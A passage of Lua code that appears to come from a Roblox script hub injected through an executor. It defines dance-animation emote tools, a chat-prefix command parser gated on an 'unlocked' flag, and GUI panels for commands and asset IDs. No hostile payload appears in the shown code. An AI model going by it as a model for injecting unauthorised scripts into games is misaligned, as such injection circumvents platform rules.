		animTrack = animator:LoadAnimation(animation)
		animTrack.Priority = Enum.AnimationPriority.Action
		animTrack:Play()
	end)

	tool.Unequipped:Connect(function()
		if animTrack then
			animTrack:Stop()
			animTrack = nil
		end
	end)
end

local tool = giveTool()
setupTool(tool)

LocalPlayer.CharacterAdded:Connect(function()
	t(0.5)
	local tool = giveTool()
	setupTool(tool)
end)
]], "CS / SS")

cscript("r15 caramelldansen tool", [[
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local TOOL_NAME = "caramelldansen"
local ANIMATION_ID = "rbxassetid://88315693621494"

local function giveTool()
	if LocalPlayer:FindFirstChildOfClass("Backpack"):FindFirstChild(TOOL_NAME) then return end

	local tool = Instance.new("Tool")
	tool.Name = TOOL_NAME
	tool.RequiresHandle = false
	tool.CanBeDropped = false
	tool.Parent = LocalPlayer:WaitForChild("Backpack")

	return tool
end

local function setupTool(tool)
	local animTrack = nil
	local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
	local humanoid = character:WaitForChild("Humanoid")
	local animator = humanoid:FindFirstChildOfClass("Animator") or Instance.new("Animator", humanoid)

	local animation = Instance.new("Animation")
	animation.AnimationId = ANIMATION_ID

	tool.Equipped:Connect(function()
		if animTrack then animTrack:Stop() end
		animTrack = animator:LoadAnimation(animation)
		animTrack.Priority = Enum.AnimationPriority.Action
		animTrack:Play()
	end)

	tool.Unequipped:Connect(function()
		if animTrack then
			animTrack:Stop()
			animTrack = nil
		end
	end)
end

local tool = giveTool()
setupTool(tool)

LocalPlayer.CharacterAdded:Connect(function()
	t(0.5)
	local tool = giveTool()
	setupTool(tool)
end)
]], "CS / SS")

cscript("r15 gangnam style tool", [[
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local TOOL_NAME = "gangnam style"
local ANIMATION_ID = "rbxassetid://100531289776679"

local function giveTool()
	if LocalPlayer:FindFirstChildOfClass("Backpack"):FindFirstChild(TOOL_NAME) then return end

	local tool = Instance.new("Tool")
	tool.Name = TOOL_NAME
	tool.RequiresHandle = false
	tool.CanBeDropped = false
	tool.Parent = LocalPlayer:WaitForChild("Backpack")

	return tool
end

local function setupTool(tool)
	local animTrack = nil
	local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
	local humanoid = character:WaitForChild("Humanoid")
	local animator = humanoid:FindFirstChildOfClass("Animator") or Instance.new("Animator", humanoid)

	local animation = Instance.new("Animation")
	animation.AnimationId = ANIMATION_ID

	tool.Equipped:Connect(function()
		if animTrack then animTrack:Stop() end
		animTrack = animator:LoadAnimation(animation)
		animTrack.Priority = Enum.AnimationPriority.Action
		animTrack:Play()
	end)

	tool.Unequipped:Connect(function()
		if animTrack then
			animTrack:Stop()
			animTrack = nil
		end
	end)
end

local tool = giveTool()
setupTool(tool)

LocalPlayer.CharacterAdded:Connect(function()
	t(0.5)
	local tool = giveTool()
	setupTool(tool)
end)
]], "CS / SS")

cscript("r15 flopping fish tool", [[
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local TOOL_NAME = "flopping fish"
local ANIMATION_ID = "rbxassetid://79075971527754"

local function giveTool()
	if LocalPlayer:FindFirstChildOfClass("Backpack"):FindFirstChild(TOOL_NAME) then return end

	local tool = Instance.new("Tool")
	tool.Name = TOOL_NAME
	tool.RequiresHandle = false
	tool.CanBeDropped = false
	tool.Parent = LocalPlayer:WaitForChild("Backpack")

	return tool
end

local function setupTool(tool)
	local animTrack = nil
	local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
	local humanoid = character:WaitForChild("Humanoid")
	local animator = humanoid:FindFirstChildOfClass("Animator") or Instance.new("Animator", humanoid)

	local animation = Instance.new("Animation")
	animation.AnimationId = ANIMATION_ID

	tool.Equipped:Connect(function()
		if animTrack then animTrack:Stop() end
		animTrack = animator:LoadAnimation(animation)
		animTrack.Priority = Enum.AnimationPriority.Action
		animTrack:Play()
	end)

	tool.Unequipped:Connect(function()
		if animTrack then
			animTrack:Stop()
			animTrack = nil
		end
	end)
end

local tool = giveTool()
setupTool(tool)

LocalPlayer.CharacterAdded:Connect(function()
	t(0.5)
	local tool = giveTool()
	setupTool(tool)
end)
]], "CS / SS")

cscript("r15 da hood dance tool", [[
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local TOOL_NAME = "da hood dance"
local ANIMATION_ID = "rbxassetid://108171959207138"

local function giveTool()
	if LocalPlayer:FindFirstChildOfClass("Backpack"):FindFirstChild(TOOL_NAME) then return end

	local tool = Instance.new("Tool")
	tool.Name = TOOL_NAME
	tool.RequiresHandle = false
	tool.CanBeDropped = false
	tool.Parent = LocalPlayer:WaitForChild("Backpack")

	return tool
end

local function setupTool(tool)
	local animTrack = nil
	local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
	local humanoid = character:WaitForChild("Humanoid")
	local animator = humanoid:FindFirstChildOfClass("Animator") or Instance.new("Animator", humanoid)

	local animation = Instance.new("Animation")
	animation.AnimationId = ANIMATION_ID

	tool.Equipped:Connect(function()
		if animTrack then animTrack:Stop() end
		animTrack = animator:LoadAnimation(animation)
		animTrack.Priority = Enum.AnimationPriority.Action
		animTrack:Play()
	end)

	tool.Unequipped:Connect(function()
		if animTrack then
			animTrack:Stop()
			animTrack = nil
		end
	end)
end

local tool = giveTool()
setupTool(tool)

LocalPlayer.CharacterAdded:Connect(function()
	t(0.5)
	local tool = giveTool()
	setupTool(tool)
end)
]], "CS / SS")

cscript("r15 helicopter 3 tool", [[
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local TOOL_NAME = "helicopter 3"
local ANIMATION_ID = "rbxassetid://95301257497525"

local function giveTool()
	if LocalPlayer:FindFirstChildOfClass("Backpack"):FindFirstChild(TOOL_NAME) then return end

	local tool = Instance.new("Tool")
	tool.Name = TOOL_NAME
	tool.RequiresHandle = false
	tool.CanBeDropped = false
	tool.Parent = LocalPlayer:WaitForChild("Backpack")

	return tool
end

local function setupTool(tool)
	local animTrack = nil
	local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
	local humanoid = character:WaitForChild("Humanoid")
	local animator = humanoid:FindFirstChildOfClass("Animator") or Instance.new("Animator", humanoid)

	local animation = Instance.new("Animation")
	animation.AnimationId = ANIMATION_ID

	tool.Equipped:Connect(function()
		if animTrack then animTrack:Stop() end
		animTrack = animator:LoadAnimation(animation)
		animTrack.Priority = Enum.AnimationPriority.Action
		animTrack:Play()
	end)

	tool.Unequipped:Connect(function()
		if animTrack then
			animTrack:Stop()
			animTrack = nil
		end
	end)
end

local tool = giveTool()
setupTool(tool)

LocalPlayer.CharacterAdded:Connect(function()
	t(0.5)
	local tool = giveTool()
	setupTool(tool)
end)
]], "CS / SS")

cscript("r15 california girls tool", [[
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local TOOL_NAME = "california girls"
local ANIMATION_ID = "rbxassetid://124982597491660"

local function giveTool()
	if LocalPlayer:FindFirstChildOfClass("Backpack"):FindFirstChild(TOOL_NAME) then return end

	local tool = Instance.new("Tool")
	tool.Name = TOOL_NAME
	tool.RequiresHandle = false
	tool.CanBeDropped = false
	tool.Parent = LocalPlayer:WaitForChild("Backpack")

	return tool
end

local function setupTool(tool)
	local animTrack = nil
	local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
	local humanoid = character:WaitForChild("Humanoid")
	local animator = humanoid:FindFirstChildOfClass("Animator") or Instance.new("Animator", humanoid)

	local animation = Instance.new("Animation")
	animation.AnimationId = ANIMATION_ID

	tool.Equipped:Connect(function()
		if animTrack then animTrack:Stop() end
		animTrack = animator:LoadAnimation(animation)
		animTrack.Priority = Enum.AnimationPriority.Action
		animTrack:Play()
	end)

	tool.Unequipped:Connect(function()
		if animTrack then
			animTrack:Stop()
			animTrack = nil
		end
	end)
end

local tool = giveTool()
setupTool(tool)

LocalPlayer.CharacterAdded:Connect(function()
	t(0.5)
	local tool = giveTool()
	setupTool(tool)
end)
]], "CS / SS")

-------------------------------------------------------------------------------------------------------------------------------

uwu["commands tab"].Size = UDim2.new(0, 100, 0, 26)
uwu["commands tab"].Position = UDim2.new(0, 100, 0, 1)

uwu["commands tab"].BackgroundColor3 = uwu["default background color"]

uwu["commands tab"].BorderColor3 = uwu["default border color"]
uwu["commands tab"].BorderSizePixel = 1

uwu["commands tab"].TextColor3 = uwu["default border color"]
uwu["commands tab"].Font = Enum.Font.RobotoMono
uwu["commands tab"].TextSize = 15
uwu["commands tab"].TextScaled = false
uwu["commands tab"].Text = "commands"
uwu["commands tab"].TextXAlignment = Enum.TextXAlignment.Center
uwu["commands tab"].TextYAlignment = Enum.TextYAlignment.Center

uwu["commands tab text padding"] = Instance.new("UIPadding")
uwu["commands tab text padding"].PaddingLeft = UDim.new(0, 0)
uwu["commands tab text padding"].Parent = uwu["commands tab"]

uwu["commands tab"].Parent = uwu["main frame 1"]
uwu["commands tab"].ZIndex = 19

uwu["commands tab bottom cover"].Size = UDim2.new(0, 100, 0, 2)
uwu["commands tab bottom cover"].Position = UDim2.new(0, 100, 0, 27)
uwu["commands tab bottom cover"].BackgroundColor3 = uwu["default background color"]
uwu["commands tab bottom cover"].BorderSizePixel = 0
uwu["commands tab bottom cover"].Parent = uwu["main frame 1"]
uwu["commands tab bottom cover"].ZIndex = 19.5
uwu["commands tab bottom cover"].Visible = false

-------------------------------------------------------------------------------------------------------------------------------

uwu["list of commands"].Size = UDim2.new(0, 393, 0, 164)
uwu["list of commands"].Position = UDim2.new(0, 4, 0, 32)
uwu["list of commands"].BackgroundColor3 = uwu["default background color"]
uwu["list of commands"].BorderColor3 = uwu["default border color"]
uwu["list of commands"].BorderSizePixel = 1
uwu["list of commands"].ScrollBarThickness = 8
uwu["list of commands"].ScrollBarImageColor3 = uwu["default 1/2 color"]
uwu["list of commands"].CanvasSize = UDim2.new(0, 0, 0, 0)
uwu["list of commands"].Parent = uwu["main frame 1"]
uwu["list of commands"].ZIndex = 19
uwu["list of commands"].Visible = false
uwu["list of commands"].ScrollingDirection = Enum.ScrollingDirection.Y

local listPadding = Instance.new("UIPadding")
listPadding.PaddingLeft = UDim.new(0, 4)
listPadding.PaddingTop = UDim.new(0, 4)
listPadding.Parent = uwu["list of commands"]

local layout = Instance.new("UIListLayout")
layout.SortOrder = Enum.SortOrder.LayoutOrder
layout.Padding = UDim.new(0, 0)
layout.Parent = uwu["list of commands"]

layout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
	uwu["list of commands"].CanvasSize = UDim2.new(0, 0, 0, layout.AbsoluteContentSize.Y + 10)
end)

function populateList(scrollFrame, entries)
	for _, text in ipairs(entries) do
		local line = Instance.new("TextLabel")
		line.Size = UDim2.new(1, -10, 0, 16)
		line.TextColor3 = uwu["default border color"]
		line.BackgroundTransparency = 1
		line.Font = Enum.Font.RobotoMono
		line.TextSize = 15
		line.TextScaled = false
		line.Text = text
		line.TextWrapped = false
		line.TextXAlignment = Enum.TextXAlignment.Left
		line.ZIndex = 20
		line.Parent = scrollFrame
	end
end

-------------------------------------------------------------------------------------------------------------------------------

local commands = {}
local prefix = "."
local prefixreq = true
local lastCommandTime = 0
local commandCooldown = 0.2

local txtchatsvc = game:GetService("TextChatService").ChatVersion == Enum.ChatVersion.TextChatService

function addcommand(name, shortname, func)
	commands[string.lower(name)] = func
	if shortname and shortname ~= "" then
		commands[string.lower(shortname)] = func
	end
end

function changeprefix(newprefix)
	if newprefix and newprefix ~= "" then
		prefix = newprefix
		uwu["command prefix"].Text = "command prefix: " .. newprefix
	end
end

local function parsecmds(input)
	local cmdgroups = {}
	local currentcmd = {}

	local words = {}
	for word in string.gmatch(input, "[^%s]+") do
		table.insert(words, word)
	end

	for i, word in ipairs(words) do
		if word:sub(1, #prefix) == prefix then
			if #currentcmd > 0 then
				table.insert(cmdgroups, currentcmd)
			end
			currentcmd = {word:sub(#prefix + 1)}
		elseif #currentcmd == 0 then
			currentcmd = {word}
		else
			table.insert(currentcmd, word)
		end
	end

	if #currentcmd > 0 then
		table.insert(cmdgroups, currentcmd)
	end

	return cmdgroups
end

function execcmd(input)
	local now = tick()
	if now - lastCommandTime < commandCooldown then
		return false
	end

	local cmdgroups = parsecmds(input)

	if prefixreq and #cmdgroups > 1 then
		for _, cmd in ipairs(cmdgroups) do
			local cmdname = string.lower(cmd[1])
			if not commands[cmdname] then
				return false
			end
		end
	end

	local executed = false
	for _, cmd in ipairs(cmdgroups) do
		local cmdname = string.lower(table.remove(cmd, 1))
		if commands[cmdname] then
			commands[cmdname](table.unpack(cmd))
			executed = true
		end
	end

	if executed then
		lastCommandTime = now
	end

	return executed
end

local function onmsg(message, speaker)
	if speaker == game:GetService("Players").LocalPlayer then
		if message:sub(1, #prefix) == prefix then
			execcmd(message)
		end
	end
end

if txtchatsvc then
	game:GetService("TextChatService").OnIncomingMessage = function(message)
		if message.TextSource then
			local speaker = game:GetService("Players"):GetPlayerByUserId(message.TextSource.UserId)
			if uwu["unlocked"] == true then
				onmsg(message.Text, speaker)
			end
		end
	end
else
	game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.OnMessageDoneFiltering.OnClientEvent:Connect(function(messageData)
		if messageData.FromSpeaker == game:GetService("Players").LocalPlayer.Name then
			if uwu["unlocked"] == true then
				onmsg(messageData.Message, game:GetService("Players").LocalPlayer)
			end
		end
	end)
end

uwu["command bar"].Size = UDim2.new(0, 343, 0, 45)
uwu["command bar"].Position = UDim2.new(0, 4, 0, 201)

uwu["command bar"].BackgroundColor3 = uwu["default background color"]
uwu["command bar"].BorderColor3 = uwu["default border color"]
uwu["command bar"].BorderSizePixel = 1
uwu["command bar"].ClipsDescendants = true

uwu["command bar"].TextColor3 = uwu["default border color"]
uwu["command bar"].Font = Enum.Font.RobotoMono
uwu["command bar"].TextSize = 15
uwu["command bar"].TextScaled = false
uwu["command bar"].PlaceholderText = "type command here"
uwu["command bar"].PlaceholderColor3 = uwu["default 1/2 color"]
uwu["command bar"].ClearTextOnFocus = true
uwu["command bar"].Text = ""
uwu["command bar"].TextXAlignment = Enum.TextXAlignment.Center
uwu["command bar"].TextYAlignment = Enum.TextYAlignment.Center

uwu["command bar text padding"] = Instance.new("UIPadding")
uwu["command bar text padding"].PaddingLeft = UDim.new(0, 0)
uwu["command bar text padding"].Parent = uwu["command bar"]

uwu["command bar"].Parent = uwu["main frame 1"]
uwu["command bar"].ZIndex = 19
uwu["command bar"].Visible = false

-------------------------------------------------------------------------------------------------------------------------------

uwu["execute command button"].Size = UDim2.new(0, 45, 0, 45)
uwu["execute command button"].Position = UDim2.new(0, 352, 0, 201)

uwu["execute command button"].BackgroundColor3 = uwu["default background color"]

uwu["execute command button"].BorderColor3 = uwu["default border color"]
uwu["execute command button"].BorderSizePixel = 1

uwu["execute command button"].TextColor3 = uwu["default border color"]
uwu["execute command button"].Font = Enum.Font.RobotoMono
uwu["execute command button"].TextSize = 15
uwu["execute command button"].TextScaled = false
uwu["execute command button"].Visible = false
uwu["execute command button"].Text = ">_"
uwu["execute command button"].TextXAlignment = Enum.TextXAlignment.Center
uwu["execute command button"].TextYAlignment = Enum.TextYAlignment.Center

uwu["execute command button text padding"] = Instance.new("UIPadding")
uwu["execute command button text padding"].PaddingLeft = UDim.new(0, 0)
uwu["execute command button text padding"].Parent = uwu["execute command button"]

uwu["execute command button"].Parent = uwu["main frame 1"]
uwu["execute command button"].ZIndex = 19

local function handle(command, clr)
	if command == "" then
		return
	end

	if clr then
		uwu["command bar"].Text = ""
	end

	if not execcmd(command) then
		local words = {}
		for word in string.gmatch(command, "[^%s]+") do
			table.insert(words, word)
		end

		if #words > 0 then
			words[1] = prefix .. words[1]
			execcmd(table.concat(words, " "))
		end
	end
end

uwu["execute command button"].MouseButton1Click:Connect(function()
	uwu["click sound"]:Play()
	local command = uwu["command bar"].Text
	handle(command, false)
end)

uwu["command bar"].FocusLost:Connect(function(enterPressed)
	if enterPressed then
		local command = uwu["command bar"].Text
		handle(command, true)
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

uwu["asset ids tab"].Size = UDim2.new(0, 100, 0, 26)
uwu["asset ids tab"].Position = UDim2.new(0, 200, 0, 1)

uwu["asset ids tab"].BackgroundColor3 = uwu["default background color"]

uwu["asset ids tab"].BorderColor3 = uwu["default border color"]
uwu["asset ids tab"].BorderSizePixel = 1

uwu["asset ids tab"].TextColor3 = uwu["default border color"]
uwu["asset ids tab"].Font = Enum.Font.RobotoMono
uwu["asset ids tab"].TextSize = 15
uwu["asset ids tab"].TextScaled = false
uwu["asset ids tab"].Text = "asset IDs"
uwu["asset ids tab"].TextXAlignment = Enum.TextXAlignment.Center
uwu["asset ids tab"].TextYAlignment = Enum.TextYAlignment.Center

uwu["asset ids tab text padding"] = Instance.new("UIPadding")
uwu["asset ids tab text padding"].PaddingLeft = UDim.new(0, 0)
uwu["asset ids tab text padding"].Parent = uwu["asset ids tab"]

uwu["asset ids tab"].Parent = uwu["main frame 1"]
uwu["asset ids tab"].ZIndex = 19

uwu["asset ids tab bottom cover"].Size = UDim2.new(0, 100, 0, 2)
uwu["asset ids tab bottom cover"].Position = UDim2.new(0, 200, 0, 27)
uwu["asset ids tab bottom cover"].BackgroundColor3 = uwu["default background color"]
uwu["asset ids tab bottom cover"].BorderSizePixel = 0
uwu["asset ids tab bottom cover"].Parent = uwu["main frame 1"]
uwu["asset ids tab bottom cover"].ZIndex = 19.5
uwu["asset ids tab bottom cover"].Visible = false

-------------------------------------------------------------------------------------------------------------------------------

uwu["asset id type indicator"].Size = UDim2.new(0, 170, 0, 19)
uwu["asset id type indicator"].Position = UDim2.new(0, 28, 0, 32)
uwu["asset id type indicator"].BackgroundColor3 = uwu["default background color"]
uwu["asset id type indicator"].BorderColor3 = uwu["default border color"]
uwu["asset id type indicator"].BorderSizePixel = 1
uwu["asset id type indicator"].TextColor3 = uwu["default border color"]
uwu["asset id type indicator"].Font = Enum.Font.RobotoMono
uwu["asset id type indicator"].TextSize = 15
uwu["asset id type indicator"].TextScaled = false
uwu["asset id type indicator"].Text = ""
uwu["asset id type indicator"].TextXAlignment = Enum.TextXAlignment.Center
uwu["asset id type indicator"].TextYAlignment = Enum.TextYAlignment.Center
uwu["asset id type indicator text padding"] = Instance.new("UIPadding")
uwu["asset id type indicator text padding"].PaddingBottom = UDim.new(0, 1)
uwu["asset id type indicator text padding"].Parent = uwu["asset id type indicator"]
uwu["asset id type indicator"].Parent = uwu["main frame 1"]
uwu["asset id type indicator"].ZIndex = 19
uwu["asset id type indicator"].Visible = false

-------------------------------------------------------------------------------------------------------------------------------

uwu["asset id search bar"].Size = UDim2.new(0, 170, 0, 19)
uwu["asset id search bar"].Position = UDim2.new(0, 203, 0, 32)
uwu["asset id search bar"].BackgroundColor3 = uwu["default background color"]
uwu["asset id search bar"].BorderColor3 = uwu["default border color"]
uwu["asset id search bar"].BorderSizePixel = 1
uwu["asset id search bar"].TextColor3 = uwu["default border color"]
uwu["asset id search bar"].Font = Enum.Font.RobotoMono
uwu["asset id search bar"].TextSize = 15
uwu["asset id search bar"].TextScaled = false
uwu["asset id search bar"].Text = ""
uwu["asset id search bar"].PlaceholderColor3 = uwu["default 1/2 color"]
uwu["asset id search bar"].PlaceholderText = "search assets"
uwu["asset id search bar"].TextXAlignment = Enum.TextXAlignment.Center
uwu["asset id search bar"].TextYAlignment = Enum.TextYAlignment.Center
uwu["asset id search bar text padding"] = Instance.new("UIPadding")
uwu["asset id search bar text padding"].PaddingBottom = UDim.new(0, 1)
uwu["asset id search bar text padding"].Parent = uwu["asset id search bar"]
uwu["asset id search bar"].Parent = uwu["main frame 1"]
uwu["asset id search bar"].ZIndex = 19
uwu["asset id search bar"].Visible = false

-------------------------------------------------------------------------------------------------------------------------------

uwu["switch asset id type button"].Size = UDim2.new(0, 19, 0, 19)
uwu["switch asset id type button"].Position = UDim2.new(0, 4, 0, 32)
uwu["switch asset id type button"].BackgroundColor3 = uwu["default background color"]
uwu["switch asset id type button"].BorderColor3 = uwu["default border color"]
uwu["switch asset id type button"].BorderSizePixel = 1
uwu["switch asset id type button"].TextColor3 = uwu["default border color"]
uwu["switch asset id type button"].Font = Enum.Font.RobotoMono
uwu["switch asset id type button"].TextSize = 15
uwu["switch asset id type button"].TextScaled = false
uwu["switch asset id type button"].Text = "<"
uwu["switch asset id type button"].TextXAlignment = Enum.TextXAlignment.Center
uwu["switch asset id type button"].TextYAlignment = Enum.TextYAlignment.Center
uwu["switch asset id type button"].Parent = uwu["main frame 1"]
uwu["switch asset id type button"].ZIndex = 20
uwu["switch asset id type button"].Visible = false
uwu["switch asset id type button text padding"] = Instance.new("UIPadding")
uwu["switch asset id type button text padding"].PaddingTop = UDim.new(0, -2)
uwu["switch asset id type button text padding"].Parent = uwu["switch asset id type button"]

uwu["switch asset id type button 2"].Size = UDim2.new(0, 19, 0, 19)
uwu["switch asset id type button 2"].Position = UDim2.new(0, 378, 0, 32)
uwu["switch asset id type button 2"].BackgroundColor3 = uwu["default background color"]
uwu["switch asset id type button 2"].BorderColor3 = uwu["default border color"]
uwu["switch asset id type button 2"].BorderSizePixel = 1
uwu["switch asset id type button 2"].TextColor3 = uwu["default border color"]
uwu["switch asset id type button 2"].Font = Enum.Font.RobotoMono
uwu["switch asset id type button 2"].TextSize = 15
uwu["switch asset id type button 2"].TextScaled = false
uwu["switch asset id type button 2"].Text = ">"
uwu["switch asset id type button 2"].TextXAlignment = Enum.TextXAlignment.Center
uwu["switch asset id type button 2"].TextYAlignment = Enum.TextYAlignment.Center
uwu["switch asset id type button 2"].Parent = uwu["main frame 1"]
uwu["switch asset id type button 2"].ZIndex = 20
uwu["switch asset id type button 2"].Visible = false
uwu["switch asset id type button 2 text padding"] = Instance.new("UIPadding")
uwu["switch asset id type button 2 text padding"].PaddingTop = UDim.new(0, -2)
uwu["switch asset id type button 2 text padding"].Parent = uwu["switch asset id type button 2"]

-------------------------------------------------------------------------------------------------------------------------------

uwu["asset image 1"].Size = UDim2.new(0, 60, 0, 60)
uwu["asset image 1"].Position = UDim2.new(0, 28, 0, 56)
uwu["asset image 1"].Image = "rbxassetid://0"
uwu["asset image 1"].BackgroundColor3 = uwu["default background color"]
uwu["asset image 1"].BorderColor3 = uwu["default border color"]
uwu["asset image 1"].BorderSizePixel = 1
uwu["asset image 1"].Parent = uwu["main frame 1"]
uwu["asset image 1"].ZIndex = 19
uwu["asset image 1"].Visible = false

uwu["asset image name 1"].Size = UDim2.new(0, 280, 0, 27)
uwu["asset image name 1"].Position = UDim2.new(0, 93, 0, 56)
uwu["asset image name 1"].BackgroundColor3 = uwu["default background color"]
uwu["asset image name 1"].BorderColor3 = uwu["default border color"]
uwu["asset image name 1"].BorderSizePixel = 1
uwu["asset image name 1"].TextColor3 = uwu["default border color"]
uwu["asset image name 1"].Font = Enum.Font.RobotoMono
uwu["asset image name 1"].TextSize = 15
uwu["asset image name 1"].TextScaled = false
uwu["asset image name 1"].Text = "empty"
uwu["asset image name 1"].TextXAlignment = Enum.TextXAlignment.Center
uwu["asset image name 1"].TextYAlignment = Enum.TextYAlignment.Center
uwu["asset image name 1"].Parent = uwu["main frame 1"]
uwu["asset image name 1"].ZIndex = 19
uwu["asset image name 1"].Visible = false
uwu["asset image name 1 text padding"] = Instance.new("UIPadding")
uwu["asset image name 1 text padding"].PaddingTop = UDim.new(0, -2)
uwu["asset image name 1 text padding"].Parent = uwu["asset image name 1"]

uwu["asset image id 1"].Size = UDim2.new(0, 205, 0, 28)
uwu["asset image id 1"].Position = UDim2.new(0, 93, 0, 88)
uwu["asset image id 1"].BackgroundColor3 = uwu["default background color"]
uwu["asset image id 1"].BorderColor3 = uwu["default border color"]
uwu["asset image id 1"].BorderSizePixel = 1
uwu["asset image id 1"].TextColor3 = uwu["default border color"]
uwu["asset image id 1"].Font = Enum.Font.RobotoMono
uwu["asset image id 1"].TextSize = 15
uwu["asset image id 1"].TextScaled = false
uwu["asset image id 1"].Text = "id: empty"
uwu["asset image id 1"].TextXAlignment = Enum.TextXAlignment.Center
uwu["asset image id 1"].TextYAlignment = Enum.TextYAlignment.Center
uwu["asset image id 1"].Parent = uwu["main frame 1"]
uwu["asset image id 1"].ZIndex = 19
uwu["asset image id 1"].Visible = false
uwu["asset image id 1 text padding"] = Instance.new("UIPadding")
uwu["asset image id 1 text padding"].PaddingTop = UDim.new(0, -2)
uwu["asset image id 1 text padding"].Parent = uwu["asset image id 1"]

uwu["copy asset id 1 button"].Size = UDim2.new(0, 70, 0, 28)
uwu["copy asset id 1 button"].Position = UDim2.new(0, 303, 0, 88)
uwu["copy asset id 1 button"].BackgroundColor3 = uwu["default background color"]
uwu["copy asset id 1 button"].BorderColor3 = uwu["default border color"]
uwu["copy asset id 1 button"].BorderSizePixel = 1
uwu["copy asset id 1 button"].TextColor3 = uwu["default border color"]
uwu["copy asset id 1 button"].Font = Enum.Font.RobotoMono
uwu["copy asset id 1 button"].TextSize = 15
uwu["copy asset id 1 button"].TextScaled = false
uwu["copy asset id 1 button"].Text = "copy id"
uwu["copy asset id 1 button"].TextXAlignment = Enum.TextXAlignment.Center
uwu["copy asset id 1 button"].TextYAlignment = Enum.TextYAlignment.Center
uwu["copy asset id 1 button"].Parent = uwu["main frame 1"]
uwu["copy asset id 1 button"].ZIndex = 19
uwu["copy asset id 1 button"].Visible = false
uwu["copy asset id 1 button text padding"] = Instance.new("UIPadding")
uwu["copy asset id 1 button text padding"].PaddingTop = UDim.new(0, -2)
uwu["copy asset id 1 button text padding"].Parent = uwu["copy asset id 1 button"]

uwu["asset image 2"].Size = UDim2.new(0, 60, 0, 60)
uwu["asset image 2"].Position = UDim2.new(0, 28, 0, 121)
uwu["asset image 2"].Image = "rbxassetid://0"
uwu["asset image 2"].BackgroundColor3 = uwu["default background color"]
uwu["asset image 2"].BorderColor3 = uwu["default border color"]
uwu["asset image 2"].BorderSizePixel = 1
uwu["asset image 2"].Parent = uwu["main frame 1"]
uwu["asset image 2"].ZIndex = 19
uwu["asset image 2"].Visible = false

uwu["asset image name 2"].Size = UDim2.new(0, 280, 0, 27)
uwu["asset image name 2"].Position = UDim2.new(0, 93, 0, 121)
uwu["asset image name 2"].BackgroundColor3 = uwu["default background color"]
uwu["asset image name 2"].BorderColor3 = uwu["default border color"]
uwu["asset image name 2"].BorderSizePixel = 1
uwu["asset image name 2"].TextColor3 = uwu["default border color"]
uwu["asset image name 2"].Font = Enum.Font.RobotoMono
uwu["asset image name 2"].TextSize = 15
uwu["asset image name 2"].TextScaled = false
uwu["asset image name 2"].Text = "empty"
uwu["asset image name 2"].TextXAlignment = Enum.TextXAlignment.Center
uwu["asset image name 2"].TextYAlignment = Enum.TextYAlignment.Center
uwu["asset image name 2"].Parent = uwu["main frame 1"]
uwu["asset image name 2"].ZIndex = 19
uwu["asset image name 2"].Visible = false
uwu["asset image name 2 text padding"] = Instance.new("UIPadding")
uwu["asset image name 2 text padding"].PaddingTop = UDim.new(0, -2)
uwu["asset image name 2 text padding"].Parent = uwu["asset image name 2"]

uwu["asset image id 2"].Size = UDim2.new(0, 205, 0, 28)
uwu["asset image id 2"].Position = UDim2.new(0, 93, 0, 153)
uwu["asset image id 2"].BackgroundColor3 = uwu["default background color"]
uwu["asset image id 2"].BorderColor3 = uwu["default border color"]
uwu["asset image id 2"].BorderSizePixel = 1
uwu["asset image id 2"].TextColor3 = uwu["default border color"]
uwu["asset image id 2"].Font = Enum.Font.RobotoMono
uwu["asset image id 2"].TextSize = 15
uwu["asset image id 2"].TextScaled = false
uwu["asset image id 2"].Text = "id: empty"
uwu["asset image id 2"].TextXAlignment = Enum.TextXAlignment.Center
uwu["asset image id 2"].TextYAlignment = Enum.TextYAlignment.Center
uwu["asset image id 2"].Parent = uwu["main frame 1"]
uwu["asset image id 2"].ZIndex = 19
uwu["asset image id 2"].Visible = false
uwu["asset image id 2 text padding"] = Instance.new("UIPadding")
uwu["asset image id 2 text padding"].PaddingTop = UDim.new(0, -2)
uwu["asset image id 2 text padding"].Parent = uwu["asset image id 2"]

uwu["copy asset id 2 button"].Size = UDim2.new(0, 70, 0, 28)
uwu["copy asset id 2 button"].Position = UDim2.new(0, 303, 0, 153)
uwu["copy asset id 2 button"].BackgroundColor3 = uwu["default background color"]
uwu["copy asset id 2 button"].BorderColor3 = uwu["default border color"]
uwu["copy asset id 2 button"].BorderSizePixel = 1
uwu["copy asset id 2 button"].TextColor3 = uwu["default border color"]
uwu["copy asset id 2 button"].Font = Enum.Font.RobotoMono
uwu["copy asset id 2 button"].TextSize = 15
uwu["copy asset id 2 button"].TextScaled = false
uwu["copy asset id 2 button"].Text = "copy id"
uwu["copy asset id 2 button"].TextXAlignment = Enum.TextXAlignment.Center
uwu["copy asset id 2 button"].TextYAlignment = Enum.TextYAlignment.Center
uwu["copy asset id 2 button"].Parent = uwu["main frame 1"]
uwu["copy asset id 2 button"].ZIndex = 19
uwu["copy asset id 2 button"].Visible = false
uwu["copy asset id 2 button text padding"] = Instance.new("UIPadding")
uwu["copy asset id 2 button text padding"].PaddingTop = UDim.new(0, -2)
uwu["copy asset id 2 button text padding"].Parent = uwu["copy asset id 2 button"]

uwu["asset image 3"].Size = UDim2.new(0, 60, 0, 60)
uwu["asset image 3"].Position = UDim2.new(0, 28, 0, 186)
uwu["asset image 3"].Image = "rbxassetid://0"
uwu["asset image 3"].BackgroundColor3 = uwu["default background color"]
uwu["asset image 3"].BorderColor3 = uwu["default border color"]
uwu["asset image 3"].BorderSizePixel = 1
uwu["asset image 3"].Parent = uwu["main frame 1"]
uwu["asset image 3"].ZIndex = 19
uwu["asset image 3"].Visible = false

uwu["asset image name 3"].Size = UDim2.new(0, 280, 0, 27)
